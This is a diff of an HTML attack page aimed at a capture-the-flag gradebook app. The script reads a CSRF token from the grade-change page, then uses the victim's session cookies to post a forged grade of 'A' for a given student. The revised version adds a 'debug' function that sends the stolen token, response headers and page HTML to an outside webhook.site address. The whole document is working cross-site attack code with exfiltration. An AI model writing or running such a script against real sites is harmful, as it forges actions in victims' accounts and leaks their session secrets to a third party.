@@ -1,42 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Grade Change</title>
+    <title>Grade Change Debug</title>
 </head>
 <body>
     <script>
-        // First, fetch the grade-change page to get the CSRF token
-        fetch('https://gradebook-app.ctf.csaw.io/grade-change')
-            .then(response => response.text())
-            .then(html => {
-                // Parse the HTML to extract the CSRF token
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(html, 'text/html');
-                const csrfToken = doc.querySelector('input[name="csrf_token"]').value;
-
-                // Now, submit the POST request with the token
-                const formData = new FormData();
-                formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
-                formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
-                formData.append('grade', 'A');
-                formData.append('csrf_token', csrfToken);
-
-                fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
-                    method: 'POST',
-                    body: formData,
-                    credentials: 'include'  // include cookies (session)
-                })
-                .then(response => response.text())
-                .then(result => {
-                    console.log('Grade change result:', result);
-                })
-                .catch(error => {
-                    console.error('Error:', error);
-                });
-            })
-            .catch(error => {
-                console.error('Error fetching CSRF token:', error);
+        const webhookUrl = 'https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb';
+        
+        // Send debug message to webhook
+        function sendDebug(message, data = null) {
+            const debugData = {
+                timestamp: new Date().toISOString(),
+                message: message,
+                data: data
+            };
+            
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(debugData)
+            }).catch(error => {
+                console.error('Failed to send debug:', error);
             });
+        }
+
+        sendDebug('Script started execution');
+
+        // First, fetch the grade-change page to get the CSRF token
+        sendDebug('Attempting to fetch CSRF token from /grade-change');
+        
+        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
+            credentials: 'include'
+        })
+        .then(response => {
+            sendDebug('Received response for CSRF token fetch', {
+                status: response.status,
+                statusText: response.statusText,
+                url: response.url,
+                headers: Object.fromEntries(response.headers.entries())
+            });
+            return response.text();
+        })
+        .then(html => {
+            sendDebug('Successfully received HTML response for CSRF token');
+            
+            // Parse the HTML to extract the CSRF token
+            const parser = new DOMParser();
+            const doc = parser.parseFromString(html, 'text/html');
+            const csrfInput = doc.querySelector('input[name="csrf_token"]');
+            
+            if (!csrfInput) {
+                sendDebug('CSRF token input not found in HTML', {
+                    htmlSnippet: html.substring(0, 1000) // First 1000 chars
+                });
+                throw new Error('CSRF token input not found');
+            }
+            
+            const csrfToken = csrfInput.value;
+            sendDebug('CSRF token extracted successfully', {
+                csrfToken: csrfToken
+            });
+
+            // Prepare the POST data
+            const formData = new FormData();
+            formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
+            formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
+            formData.append('grade', 'A');
+            formData.append('csrf_token', csrfToken);
+
+            sendDebug('Attempting POST request to /grade-change', {
+                formData: Array.from(formData.entries())
+            });
+
+            // Now, submit the POST request with the token
+            return fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
+                method: 'POST',
+                body: formData,
+                credentials: 'include'
+            });
+        })
+        .then(response => {
+            sendDebug('Received response from POST to /grade-change', {
+                status: response.status,
+                statusText: response.statusText,
+                url: response.url,
+                headers: Object.fromEntries(response.headers.entries())
+            });
+            return response.text();
+        })
+        .then(result => {
+            sendDebug('POST request completed successfully', {
+                responseText: result.substring(0, 2000) // First 2000 chars
+            });
+        })
+        .catch(error => {
+            sendDebug('Error occurred during grade change attempt', {
+                error: error.toString(),
+                errorStack: error.stack,
+                errorName: error.name
+            });
+        });
     </script>
 </body>
 </html>
